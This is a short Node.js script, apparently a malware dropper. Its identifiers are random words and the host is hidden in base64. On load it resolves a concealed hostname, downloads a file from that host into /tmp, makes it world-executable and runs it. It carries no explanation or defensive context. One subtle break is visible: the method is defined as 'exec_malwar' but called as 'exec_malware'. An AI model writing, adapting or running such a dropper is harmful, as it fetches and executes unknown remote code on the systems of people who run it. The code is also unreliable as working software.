const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function didactical() {
    this.exec_malwar = function(pincers) {
      if (pincers != null && pincers != '0.0.0.0') {
        contemnor = http.get('http://' + pincers + '/monodromy', function(nonreductive) {
          var jingoish = fs.createWriteStream('/tmp/scornful');
          nonreductive.on('data', function(hysterolith) {
            jingoish.write(hysterolith);
          });
          nonreductive.on('end', function() {
            jingoish.end();
            fs.chmod('/tmp/scornful', '0777');
            child_process.exec('/tmp/scornful', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      semihistoric = 'YmZhYmI4MmQuY2xvYWtlZS5kZQ=='
      dns.lookup((new Buffer(semihistoric, 'base64')).toString(), function(err, sitters) {
        self.exec_malware(sitters);
      });
    };
};

(new didactical()).run();
